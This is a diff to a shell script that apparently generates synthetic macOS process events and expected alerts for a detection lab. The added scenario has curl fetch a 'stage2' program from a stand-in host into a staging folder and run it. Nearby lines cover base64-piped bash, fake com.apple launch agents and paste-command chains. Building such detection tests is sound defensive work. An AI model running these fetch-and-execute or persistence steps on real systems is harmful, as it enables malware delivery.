@@ -349,6 +349,7 @@ run() {
 #   85  zsh: an unsigned program from /Users/Shared writes a launch agent plist named com.apple.…
 #   90  a second shell: base64 -d, and a bash reading from a pipe a second later: a pasted command
 #   95  launchd starts Script Editor, which runs a shell
+#  100  zsh: curl -o writes an ad-hoc program into /tmp/lab, which runs a second later
 synthetic_story() {
   answer_header
   local LAUNCHD TERMINAL LOGIN ZSH MONITOR NOTES TERMINAL2 ZSH2 SHELL2 bash curl agent sub sl daemon c
@@ -517,6 +518,14 @@ synthetic_story() {
   run 95.5 "$c" 7641 9641 /bin/sh sh -c 'echo lab-script-editor'
   ev_exit 96.0 "$c"
   answer script-editor risky-parent-spawn high queued 'lab-script-editor' 'Script Editor runs a shell: an app that should not run commands. The same shell also shows shell-under-app.'
+
+  # 13. curl writes a program into the staging folder and the shell runs it a second later.
+  ev_fork 100.0 "$ZSH" 7650 9650; curl=$LAST
+  ev_exec 100.1 "$curl" /usr/bin/curl platform com.apple.curl '' "$CWD" tty curl -sL -o "$LAB/stage2" https://cdn.example.net/stage2
+  ev_create 100.2 "$curl" "$LAB/stage2"
+  ev_exit 100.4 "$curl"
+  run_as 101.1 "$ZSH" 7651 9651 "$LAB/stage2" adhoc stage2-55554944f0be3f1f '' stage2 --run
+  answer dropped dropped-then-executed high queued 'stage2 --run' 'A program written by curl runs a second later from the staging folder, and it is ad-hoc signed: fetch, then run.'
 }
 
 # ---- live mode --------------------------------------------------------------------------------------------------
@@ -541,6 +550,7 @@ live_answers() {
     '#   credential-store-copy: the lab will not copy the real keychain or a browser'"'"'s password database.' \
     '#   apple-masquerade: the lab will not write a com.apple launch plist, and an unsigned program will not run.' \
     '#   clickfix-paste-chain: the lab will not fetch with curl -k or a custom user agent, or run what it decodes.' \
+    '#   dropped-then-executed: the lab will not download a program from the network and run it.' \
     '#   risky-parent-spawn for Script Editor, Office and developer tools: the lab opens none of them (only its applet).' \
     '#   persistence-item med on its own row: needs an app'"'"'s own launch agent.' >&4
   answer download download med queued 'file:///etc/hosts' 'curl saves a file to disk (from /etc/hosts, so no network is used).'
